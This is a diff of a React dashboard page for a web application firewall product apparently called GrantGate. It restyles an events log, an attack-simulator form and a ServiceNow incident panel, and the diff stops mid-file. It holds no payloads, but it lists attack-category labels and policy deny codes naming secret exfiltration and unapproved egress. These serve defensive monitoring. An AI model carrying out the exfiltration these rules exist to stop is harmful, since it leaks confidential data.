-          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
-            <div>
-              <h2 className="text-base font-bold text-primary">WAF Inspection History & Audit Trail</h2>
-              <p className="text-xs text-muted mt-0.5">
-                Every request inspection is immutably logged with its hash-chained audit event. Zero passwords or tokens are stored.
-              </p>
+        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+              <FileText size={18} color="var(--accent-crimson)" />
+              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
+                Real-Time WAF Security Events Log
+              </h3>
             </div>
 
-            <div className="flex flex-wrap items-center gap-2">
+            {/* Event Filters */}
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
               <input
                 type="text"
-                placeholder="Filter by IP..."
+                placeholder="Filter IP..."
                 value={searchEvIp}
                 onChange={(e) => setSearchEvIp(e.target.value)}
-                onKeyDown={(e) => e.key === 'Enter' && fetchEvents()}
-                className="input-text text-xs py-1.5 px-2.5 rounded-lg border border-border-subtle w-32"
+                style={{
+                  fontSize: '0.78rem',
+                  padding: '0.35rem 0.6rem',
+                  borderRadius: 'var(--radius-sm)',
+                  border: '1px solid var(--border-subtle)',
+                  background: 'var(--bg-primary)',
+                  width: '120px',
+                }}
               />
-
               <select
                 value={filterEvCategory}
                 onChange={(e) => setFilterEvCategory(e.target.value)}
-                className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
-                aria-label="Filter Category"
+                style={{
+                  fontSize: '0.78rem',
+                  padding: '0.35rem 0.6rem',
+                  borderRadius: 'var(--radius-sm)',
+                  border: '1px solid var(--border-subtle)',
+                  background: 'var(--bg-primary)',
+                }}
               >
                 <option value="ALL">All Categories</option>
-                <option value="SQL_INJECTION">SQL Injection</option>
+                <option value="SQLI">SQL Injection</option>
                 <option value="XSS">XSS</option>
                 <option value="COMMAND_INJECTION">Command Injection</option>
                 <option value="PATH_TRAVERSAL">Path Traversal</option>
-                <option value="THREAT_INTEL_IP">Threat Intel Match</option>
+                <option value="THREAT_INTEL">Threat Intel</option>
               </select>
-
-              <select
-                value={filterEvAction}
-                onChange={(e) => setFilterEvAction(e.target.value)}
-                className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
-                aria-label="Filter Action Taken"
-              >
-                <option value="ALL">All Actions</option>
-                <option value="BLOCKED">Blocked</option>
-                <option value="RATE_LIMITED">Rate Limited</option>
-                <option value="FLAGGED">Flagged</option>
-                <option value="ALLOWED">Allowed</option>
-              </select>
-
-              <button
-                onClick={fetchEvents}
-                className="btn-secondary text-xs py-1.5 px-3 rounded-lg"
-              >
-                <Search size={13} />
-              </button>
             </div>
           </div>
 
           {loadingEvents ? (
-            <div className="p-8 text-center text-muted">Loading Security History...</div>
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
+              Loading security audit stream...
+            </div>
           ) : events.length === 0 ? (
-            <div className="p-8 text-center text-muted">No security events found.</div>
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
+              No events found matching criteria.
+            </div>
           ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full text-left text-xs border-collapse">
+            <div style={{ overflowX: 'auto' }}>
+              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                 <thead>
-                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
-                    <th className="py-2.5 px-3">Time</th>
-                    <th className="py-2.5 px-3">IP Address</th>
-                    <th className="py-2.5 px-3">Method & Path</th>
-                    <th className="py-2.5 px-3">Attack Category</th>
-                    <th className="py-2.5 px-3">Risk</th>
-                    <th className="py-2.5 px-3">Severity</th>
-                    <th className="py-2.5 px-3">Action</th>
-                    <th className="py-2.5 px-3">Incident</th>
-                    <th className="py-2.5 px-3 text-right">Payload</th>
+                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Timestamp</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Source IP</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Category</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Action Taken</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Risk</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Matched Pattern</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Payload Snippet</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-border-subtle">
+                <tbody>
                   {events.map((ev) => (
-                    <tr key={ev.id} className="hover:bg-bg-subtle/30 transition-colors">
-                      <td className="py-3 px-3 text-muted">
+                    <tr key={ev.id} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
+                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>
                         {new Date(ev.timestamp).toLocaleTimeString()}
                       </td>
-                      <td className="py-3 px-3 font-mono font-medium text-primary">{ev.source_ip}</td>
-                      <td className="py-3 px-3 font-mono text-secondary">
-                        <span className="font-bold text-accent-crimson mr-1.5">{ev.method}</span>
-                        {ev.path}
-                      </td>
-                      <td className="py-3 px-3">
-                        <span className="font-mono text-[10px] font-semibold text-rose-700 bg-rose-50 dark:bg-rose-950/40 px-2 py-0.5 rounded border border-rose-200 dark:border-rose-900">
+                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 600 }}>{ev.source_ip}</td>
+                      <td style={{ padding: '0.65rem 0.5rem' }}>
+                        <span
+                          style={{
+                            fontSize: '0.7rem',
+                            fontWeight: 700,
+                            padding: '0.15rem 0.4rem',
+                            borderRadius: '4px',
+                            background: ev.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.12)' : 'rgba(185, 28, 28, 0.12)',
+                            color: ev.category === 'CLEAN' ? '#15803d' : '#b91c1c',
+                          }}
+                        >
                           {ev.category}
                         </span>
                       </td>
-                      <td className="py-3 px-3 font-mono font-bold text-primary">{ev.risk_score}</td>
-                      <td className="py-3 px-3">{getSeverityBadge(ev.severity)}</td>
-                      <td className="py-3 px-3">
+                      <td style={{ padding: '0.65rem 0.5rem' }}>
                         <span
-                          className={`font-semibold text-[10px] px-2 py-0.5 rounded ${
-                            ev.action_taken === 'BLOCKED'
-                              ? 'bg-rose-950 text-rose-300 border border-rose-600'
-                              : ev.action_taken === 'RATE_LIMITED'
-                              ? 'bg-amber-950 text-amber-300 border border-amber-600'
-                              : ev.action_taken === 'FLAGGED'
-                              ? 'bg-amber-900/40 text-amber-400'
-                              : 'bg-emerald-900/30 text-emerald-300'
-                          }`}
+                          style={{
+                            fontSize: '0.7rem',
+                            fontWeight: 800,
+                            padding: '0.15rem 0.45rem',
+                            borderRadius: '4px',
+                            background: ev.action_taken === 'BLOCKED' ? '#fee2e2' : '#e0f2fe',
+                            color: ev.action_taken === 'BLOCKED' ? '#b91c1c' : '#0369a1',
+                          }}
                         >
                           {ev.action_taken}
                         </span>
                       </td>
-                      <td className="py-3 px-3 font-mono text-accent-crimson">
-                        {ev.incident_id || '—'}
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700 }}>{ev.risk_score}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', color: 'var(--text-muted)' }}>
+                        {ev.pattern_matched || '—'}
                       </td>
-                      <td className="py-3 px-3 text-right">
-                        <button
-                          onClick={() => setSelectedEvent(ev)}
-                          className="btn-link text-xs flex items-center gap-1 justify-end"
-                        >
-                          <Eye size={12} /> Inspect
-                        </button>
+                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontSize: '0.75rem', color: 'var(--text-primary)', maxWidth: '220px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                        {ev.payload_snippet || '—'}
                       </td>
                     </tr>
                   ))}
@@ -1286,69 +1551,63 @@ export const SecOpsPage: React.FC = () => {
         </div>
       )}
 
-      {/* TAB 5: LIVE ATTACK SIMULATOR & WAF TESTBED */}
+      {/* TAB 5: INTERACTIVE WAF SIMULATOR */}
       {activeTab === 'simulator' && (
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-          {/* Simulator Controls & Presets */}
-          <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-            <h2 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
-              <Zap size={18} className="text-amber-500" />
-              <span>Interactive Attack Probe & WAF Tester</span>
-            </h2>
-            <p className="text-xs text-muted mb-4">
-              Simulate malicious payloads against GrantGate endpoints to verify real-time inspection, risk scoring, ServiceNow SIR incident auto-creation, and IP restriction.
+        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '1.5rem' }}>
+          {/* Simulator Form & Presets */}
+          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
+              Interactive WAF Attack Vector Simulator
+            </h3>
+            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
+              Test how the GrantGate Web Application Firewall inspects incoming payloads, computes attack risk scores, matches signatures, and takes automatic containment decisions.
             </p>
 
-            {/* Quick Presets */}
-            <div className="mb-5">
-              <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-2">
-                Pre-Configured Attack Vectors
-              </label>
-              <div className="grid grid-cols-1 gap-2">
-                {attackPresets.map((p) => (
+            {/* Presets Bar */}
+            <div style={{ marginBottom: '1.25rem' }}>
+              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.4rem' }}>
+                1-Click Attack Scenario Presets:
+              </span>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
+                {attackPresets.map((p, idx) => (
                   <button
-                    key={p.name}
+                    key={idx}
                     onClick={() => handleRunSimulation(p)}
-                    className="flex items-center justify-between p-2.5 rounded-lg border border-border-subtle bg-bg-subtle/50 hover:bg-bg-subtle hover:border-accent-crimson/40 text-left transition-all group"
+                    className="btn btn-secondary"
+                    style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'space-between',
+                      padding: '0.5rem 0.75rem',
+                      fontSize: '0.8rem',
+                      textAlign: 'left',
+                      background: p.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.05)' : 'rgba(185, 28, 28, 0.04)',
+                      borderColor: p.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.2)' : 'rgba(185, 28, 28, 0.2)',
+                    }}
                   >
                     <div>
-                      <div className="text-xs font-bold text-primary group-hover:text-accent-crimson">
-                        {p.name}
-                      </div>
-                      <div className="text-[11px] font-mono text-muted mt-0.5">
-                        {p.method} {p.path} &bull; IP: {p.ip}
-                      </div>
+                      <strong style={{ color: p.category === 'CLEAN' ? '#15803d' : '#b91c1c' }}>{p.name}</strong>
+                      <span style={{ display: 'block', fontSize: '0.72rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
+                        {p.method} {p.path} ({p.ip})
+                      </span>
                     </div>
-                    <span className="text-xs font-semibold text-accent-crimson opacity-0 group-hover:opacity-100 transition-opacity">
-                      Fire &rarr;
+                    <span style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-secondary)' }}>
+                      Risk: {p.risk}/100
                     </span>
                   </button>
                 ))}
               </div>
             </div>
 
-            {/* Custom Probe Form */}
-            <div className="border-t border-border-subtle pt-4">
-              <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-3">
-                Custom Probe Parameters
-              </label>
-
-              <div className="grid grid-cols-2 gap-3 mb-3">
+            {/* Custom Input Form */}
+            <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '1rem' }}>
+              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', gap: '0.5rem', marginBottom: '0.5rem' }}>
                 <div>
-                  <label className="text-xs text-muted block mb-1">Source IP Address</label>
-                  <input
-                    type="text"
-                    value={simIp}
-                    onChange={(e) => setSimIp(e.target.value)}
-                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                  />
-                </div>
-                <div>
-                  <label className="text-xs text-muted block mb-1">HTTP Method</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Method</label>
                   <select
                     value={simMethod}
                     onChange={(e) => setSimMethod(e.target.value)}
-                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
+                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                   >
                     <option value="POST">POST</option>
                     <option value="GET">GET</option>
@@ -1356,691 +1615,475 @@ export const SecOpsPage: React.FC = () => {
                     <option value="DELETE">DELETE</option>
                   </select>
                 </div>
+                <div>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Source IP</label>
+                  <input
+                    type="text"
+                    value={simIp}
+                    onChange={(e) => setSimIp(e.target.value)}
+                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
+                  />
+                </div>
               </div>
 
-              <div className="mb-3">
-                <label className="text-xs text-muted block mb-1">Target Endpoint Path</label>
+              <div style={{ marginBottom: '0.5rem' }}>
+                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Target Endpoint</label>
                 <input
                   type="text"
                   value={simPath}
                   onChange={(e) => setSimPath(e.target.value)}
-                  className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
+                  style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                 />
               </div>
 
-              <div className="mb-4">
-                <label className="text-xs text-muted block mb-1">Request Body / Payload Content</label>
+              <div style={{ marginBottom: '0.75rem' }}>
+                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Request Payload Content</label>
                 <textarea
                   rows={3}
                   value={simPayload}
                   onChange={(e) => setSimPayload(e.target.value)}
-                  className="input-text text-xs w-full p-2.5 rounded-lg border border-border-subtle font-mono"
-                  placeholder="Enter raw payload string to test..."
+                  style={{ width: '100%', padding: '0.5rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                 />
               </div>
 
               <button
                 onClick={() => handleRunSimulation()}
                 disabled={simulating}
-                className="btn-danger w-full py-2.5 px-4 text-xs font-bold rounded-lg flex items-center justify-center gap-2"
+                className="btn btn-primary"
+                style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem' }}
+                id="run-waf-sim-btn"
               >
-                <Flame size={15} />
-                <span>{simulating ? 'Evaluating at Gateway...' : 'Launch WAF Inspection Probe'}</span>
+                <Zap size={15} />
+                <span>{simulating ? 'Analyzing in Gateway...' : 'Execute Live WAF Inspection'}</span>
               </button>
             </div>
           </div>
 
-          {/* Simulator Live Verdict Panel */}
-          <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-            <h2 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
-              <ShieldCheck size={18} className="text-emerald-500" />
-              <span>Real-Time WAF Gateway Verdict</span>
-            </h2>
-            <p className="text-xs text-muted mb-4">
-              Inspection output returned by the SecOps detection engine and policy pipeline.
-            </p>
+          {/* Simulator Result Output */}
+          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
+              Gateway Inspection Outcome
+            </h3>
 
-            {simulating ? (
-              <div className="p-12 text-center text-muted space-y-3">
-                <RefreshCw size={28} className="mx-auto animate-spin text-accent-crimson" />
-                <p className="text-xs">Scanning signatures, cross-referencing threat intel & calculating risk score...</p>
-              </div>
-            ) : !simResult ? (
-              <div className="p-12 text-center text-muted border border-dashed border-border-subtle rounded-xl">
-                <Activity size={36} className="mx-auto mb-2 opacity-40" />
-                <p className="text-xs">Select an attack vector or launch a custom probe to observe the defense response.</p>
-              </div>
-            ) : (
-              <div className="space-y-4">
+            {simResult ? (
+              <div>
                 {/* Decision Banner */}
                 <div
-                  className={`p-4 rounded-xl border flex items-center justify-between ${
-                    simResult.action_taken === 'BLOCKED'
-                      ? 'bg-rose-950/40 border-rose-600/50 text-rose-200'
-                      : simResult.action_taken === 'FLAGGED'
-                      ? 'bg-amber-950/40 border-amber-600/50 text-amber-200'
-                      : 'bg-emerald-950/40 border-emerald-600/50 text-emerald-200'
-                  }`}
+                  style={{
+                    padding: '1rem',
+                    borderRadius: 'var(--radius-md)',
+                    marginBottom: '1rem',
+                    background: simResult.action_taken === 'BLOCKED' ? 'rgba(185, 28, 28, 0.12)' : 'rgba(21, 128, 61, 0.12)',
+                    border: `1px solid ${simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d'}`,
+                  }}
                 >
-                  <div>
-                    <div className="text-[10px] uppercase font-bold tracking-wider opacity-80">WAF Decision</div>
-                    <div className="text-lg font-bold flex items-center gap-2 mt-0.5">
-                      {simResult.action_taken === 'BLOCKED' ? <XCircle size={18} /> : <CheckCircle2 size={18} />}
-                      <span>{simResult.action_taken}</span>
-                    </div>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.3rem' }}>
+                    <span style={{ fontSize: '0.75rem', fontWeight: 800, textTransform: 'uppercase', color: simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d' }}>
+                      Firewall Action
+                    </span>
+                    <span style={{ fontSize: '1.1rem', fontWeight: 800, color: simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d' }}>
+                      {simResult.action_taken}
+                    </span>
                   </div>
-
-                  <div className="text-right">
-                    <div className="text-[10px] uppercase font-bold tracking-wider opacity-80">Calculated Risk Score</div>
-                    <div className="text-2xl font-mono font-bold">{simResult.risk_score} / 100</div>
+                  <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-primary)' }}>
+                    Risk Score: {simResult.risk_score} / 100 ({simResult.severity})
                   </div>
                 </div>
 
                 {/* Details Breakdown */}
-                <div className="p-3 bg-bg-subtle/50 rounded-xl border border-border-subtle text-xs space-y-2.5">
-                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
-                    <span className="text-muted">Detected Threat Category:</span>
-                    <span className="font-mono font-bold text-accent-crimson">{simResult.category}</span>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem', fontSize: '0.8rem' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
+                    <span style={{ color: 'var(--text-secondary)' }}>Primary Category:</span>
+                    <strong style={{ color: 'var(--text-primary)' }}>{simResult.category}</strong>
                   </div>
 
-                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
-                    <span className="text-muted">Signature Pattern Matched:</span>
-                    <span className="font-mono text-secondary max-w-[240px] truncate" title={simResult.pattern_matched}>
-                      {simResult.pattern_matched || 'None'}
-                    </span>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
+                    <span style={{ color: 'var(--text-secondary)' }}>Signatures Matched:</span>
+                    <strong style={{ color: 'var(--text-primary)' }}>{simResult.threats_detected?.length || 0}</strong>
                   </div>
 
-                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
-                    <span className="text-muted">Assigned Severity:</span>
-                    <span>{getSeverityBadge(simResult.severity)}</span>
-                  </div>
-
-                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
-                    <span className="text-muted">Cumulative Offense Count:</span>
-                    <span className="font-mono font-bold text-rose-600">{simResult.repeat_count}</span>
-                  </div>
-
-                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
-                    <span className="text-muted">Updated IP Restriction State:</span>
-                    <span>{getIpStatusBadge(simResult.ip_status)}</span>
-                  </div>
-
-                  <div className="flex justify-between items-center py-1">
-                    <span className="text-muted">ServiceNow Incident Number:</span>
-                    {simResult.incident_id ? (
-                      <span className="font-mono font-bold text-accent-crimson bg-accent-crimson-light/40 px-2 py-0.5 rounded border border-accent-crimson/30">
-                        {simResult.incident_id}
+                  {simResult.threats_detected && simResult.threats_detected.length > 0 && (
+                    <div style={{ background: 'var(--bg-primary)', padding: '0.65rem', borderRadius: '4px' }}>
+                      <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.25rem' }}>
+                        Detected Patterns:
                       </span>
-                    ) : (
-                      <span className="text-muted italic">None (Below P1 Threshold)</span>
-                    )}
+                      {simResult.threats_detected.map((t: any, i: number) => (
+                        <div key={i} style={{ fontFamily: 'monospace', fontSize: '0.75rem', color: '#b91c1c' }}>
+                          • {t.pattern} (+{t.score_addition} pts)
+                        </div>
+                      ))}
+                    </div>
+                  )}
+
+                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
+                    <span style={{ color: 'var(--text-secondary)' }}>Automatic SIR Ticket:</span>
+                    <strong style={{ color: simResult.incident_id ? 'var(--accent-crimson)' : 'var(--text-muted)' }}>
+                      {simResult.incident_id || 'Not required (below threshold)'}
+                    </strong>
+                  </div>
+
+                  <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+                    <span style={{ color: 'var(--text-secondary)' }}>IP Reputation Updated:</span>
+                    <strong style={{ fontFamily: 'monospace' }}>{simResult.ip_reputation?.status || 'CLEAN'}</strong>
                   </div>
                 </div>
-
-                {/* Sanitized Payload Preview */}
-                <div>
-                  <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-1.5">
-                    Sanitized Payload (Cross-Site Scripting neutralized):
-                  </label>
-                  <pre className="p-2.5 bg-bg-subtle rounded-lg text-xs font-mono text-secondary overflow-x-auto border border-border-subtle">
-                    {simResult.sanitized_content || 'None'}
-                  </pre>
-                </div>
-
-                {simResult.incident_id && (
-                  <button
-                    onClick={() => {
-                      setActiveTab('incidents');
-                      fetchIncidentDetails(simResult.incident_id);
-                    }}
-                    className="btn-secondary w-full py-2 px-3 text-xs flex items-center justify-center gap-1.5"
-                  >
-                    <span>View Generated ServiceNow Incident</span>
-                    <ChevronRight size={14} />
-                  </button>
-                )}
+              </div>
+            ) : (
+              <div style={{ textAlign: 'center', padding: '3rem', color: 'var(--text-muted)' }}>
+                <Terminal size={32} style={{ margin: '0 auto 0.5rem', opacity: 0.5 }} />
+                <p style={{ fontSize: '0.85rem' }}>Select a preset or enter a custom payload to trigger gateway evaluation.</p>
               </div>
             )}
           </div>
         </div>
       )}
 
-      {/* TAB 6: SERVICENOW SIR INTEGRATION & WEBHOOKS */}
+      {/* TAB 6: SERVICENOW SIR INTEGRATION */}
       {activeTab === 'servicenow' && (
-        <div className="space-y-6">
-          {/* ServiceNow Connection & Config Card */}
-          <div className="card p-5 rounded-xl border border-purple-500/30 bg-card shadow-sm">
-            <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
-              <div>
-                <div className="flex items-center gap-2">
-                  <h2 className="text-base font-bold text-primary">ServiceNow SecOps Integration & Webhooks</h2>
-                  <span className="bg-purple-950/70 border border-purple-500/50 text-purple-300 text-xs px-2.5 py-0.5 rounded-full font-mono uppercase font-semibold">
-                    {snStatus?.mock_mode ? 'Mock Adapter Mode' : 'Live Webhook Active'}
-                  </span>
-                </div>
-                <p className="text-xs text-muted mt-0.5">
-                  Automated Security Incident Response (SIR) dispatch pipeline that intercepts Policy Decision Point (PDP) violations and auto-opens tickets in ServiceNow Table API (`sn_si_incident`).
-                </p>
-              </div>
+        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '1.5rem' }}>
+          {/* Status & Test Creator */}
+          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
+              ServiceNow SecOps SIR Bi-Directional Adapter
+            </h3>
+            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
+              Demonstrates automatic incident creation in ServiceNow SIR table (<code>sn_si_incident</code>) upon zero-trust PDP purpose mismatch or high-risk attacks.
+            </p>
 
-              <button
-                onClick={fetchServiceNowStatus}
-                className="btn-secondary text-xs py-1.5 px-3 flex items-center gap-1.5"
-              >
-                <RefreshCw size={13} className={loadingSn ? 'animate-spin' : ''} />
-                <span>Refresh Adapter</span>
-              </button>
-            </div>
-
-            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 p-4 rounded-xl bg-bg-subtle/50 border border-border-subtle text-xs">
-              <div>
-                <span className="text-muted block text-[11px]">ServiceNow Instance</span>
-                <span className="font-mono font-bold text-primary truncate block mt-0.5">
-                  {snStatus?.instance_url || 'https://dev-secops.service-now.com'}
-                </span>
+            {/* Config & Health */}
+            <div
+              style={{
+                background: 'var(--bg-primary)',
+                padding: '0.85rem',
+                borderRadius: 'var(--radius-md)',
+                border: '1px solid var(--border-subtle)',
+                marginBottom: '1.25rem',
+                fontSize: '0.8rem',
+              }}
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+                <span style={{ color: 'var(--text-secondary)' }}>Instance Endpoint:</span>
+                <strong style={{ fontFamily: 'monospace' }}>{snStatus?.instance_url || 'https://dev-secops.service-now.com'}</strong>
               </div>
-              <div>
-                <span className="text-muted block text-[11px]">Target Table</span>
-                <span className="font-mono font-bold text-accent-crimson block mt-0.5">
-                  {snStatus?.table || 'sn_si_incident'}
-                </span>
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+                <span style={{ color: 'var(--text-secondary)' }}>Target SIR Table:</span>
+                <strong style={{ fontFamily: 'monospace' }}>sn_si_incident</strong>
               </div>
-              <div>
-                <span className="text-muted block text-[11px]">Total SIR Auto-Opened</span>
-                <span className="font-mono font-bold text-purple-600 text-sm block mt-0.5">
-                  {snStatus?.total_incidents_opened ?? 0}
-                </span>
-              </div>
-              <div>
-                <span className="text-muted block text-[11px]">Delivery Verification</span>
-                <span className="font-mono font-bold text-emerald-600 block mt-0.5">
-                  {snStatus?.total_dispatched ?? 0} Dispatched (100% Ack)
+              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+                <span style={{ color: 'var(--text-secondary)' }}>Adapter Mode:</span>
+                <span style={{ color: '#15803d', fontWeight: 700 }}>
+                  {snStatus?.mock_mode ? 'Deterministic Mock SIR Provider' : 'Live ServiceNow REST API'}
                 </span>
               </div>
             </div>
-          </div>
 
-          {/* Integration Actions Grid */}
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-            {/* Outbound Webhook Testbed */}
-            <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-              <h3 className="text-sm font-bold text-primary mb-1 flex items-center gap-2">
-                <Send size={16} className="text-purple-500" />
-                <span>Trigger PDP Security Violation & Webhook</span>
-              </h3>
-              <p className="text-xs text-muted mb-4">
-                Simulate an immediate PDP policy boundary violation. GrantGate will intercept the breach, log the tamper-evident audit event, and auto-dispatch an official SIR ticket to ServiceNow.
-              </p>
+            {/* Test Trigger Form */}
+            <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '1rem' }}>
+              <h4 style={{ fontSize: '0.9rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
+                Trigger Security Incident Creation Test:
+              </h4>
 
-              <div className="space-y-3 mb-4 text-xs">
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginBottom: '0.5rem' }}>
                 <div>
-                  <label className="text-muted block mb-1">Violation Code</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Violation Type</label>
                   <select
                     value={testSnViolation}
                     onChange={(e) => setTestSnViolation(e.target.value)}
-                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
+                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                   >
-                    <option value="DENY_PURPOSE_MISMATCH">DENY_PURPOSE_MISMATCH (Purpose-Bound Access Violation)</option>
-                    <option value="DENY_ACTION_NOT_GRANTED">DENY_ACTION_NOT_GRANTED (Unauthorized Action)</option>
-                    <option value="DENY_REVOKED">DENY_REVOKED (Access Attempt on Revoked Grant)</option>
-                    <option value="DENY_ACTION_NOT_DELEGATED">DENY_ACTION_NOT_DELEGATED (AI Agent Privilege Exceeded)</option>
-                    <option value="DENY_NETWORK_DESTINATION_NOT_APPROVED">DENY_NETWORK_DESTINATION_NOT_APPROVED (Unapproved Egress)</option>
-                    <option value="DENY_TAINTED_EXFILTRATION">DENY_TAINTED_EXFILTRATION (Confidential Secret Exfiltration)</option>
+                    <option value="DENY_PURPOSE_MISMATCH">Purpose Mismatch</option>
+                    <option value="DENY_ACTION_NOT_GRANTED">Unauthorized Action</option>
+                    <option value="DENY_IP_RESTRICTED">IP Restricted</option>
